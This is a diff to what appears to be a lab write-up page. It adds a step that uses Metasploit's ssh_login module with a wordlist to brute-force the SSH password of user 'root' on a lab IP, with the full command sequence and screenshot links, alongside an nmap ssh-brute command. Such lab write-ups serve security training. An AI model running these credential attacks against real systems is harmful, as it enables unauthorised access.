@@ -109,6 +109,40 @@ nmap 192.239.69.3 -p 22 --script ssh-brute --script-args userdb=/root/user
 <br />
 <br />
 <br />
+Utilize the msfconsole (Metasploit) tool to conduct a dictionary attack and try to find a valid password for user "root": <br/>
+<br/>
+- We can see that Metasploit was able to use a wordlist to successfully find a password (attack) for the user "root". 
+<br/>
+<br/>
+Commands: msfconsole
+<br/>
+use auxiliary/scanner/ssh/ssh_login
+<br/>
+set rhosts 192.239.69.3
+<br/>
+set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
+<br/>
+set stop_on_success true
+<br/>
+set verbose true
+<br/>
+exploit
+<br/>
+<br/>
+<img src="https://i.imgur.com/EckkDx3.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
+<br />
+<img src="https://i.imgur.com/7lV2bHA.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
+<br />
+<img src="https://i.imgur.com/hV3G79C.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
+<br />
+<img src="https://i.imgur.com/bFKCi8s.png" height="80%" width="80%" alt="SSH Dictionary Attack" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
 
 
 
